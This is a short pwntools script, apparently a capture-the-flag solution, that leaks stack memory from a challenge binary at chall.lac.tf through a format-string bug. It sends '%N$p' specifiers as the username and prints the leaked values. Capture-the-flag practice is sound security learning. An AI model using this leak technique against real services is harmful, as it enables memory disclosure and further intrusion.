from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("chall.lac.tf", 31142)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
context.log_level = 'error'

def get_value(i):
    io = start()
    io.sendlineafter("Enter username: ", f"%{i}$p".encode())
    io.sendlineafter("Enter password1: ", b"AA")
    io.sendlineafter("Enter password2: ", b"AA")
    io.recvuntil("Incorrect password for user ")
    content = io.recvline().decode().strip()
    io.close()
    return content

#for i in range(1, 20):
#    print(get_value(i))

print(get_value(6), get_value(7), get_value(8))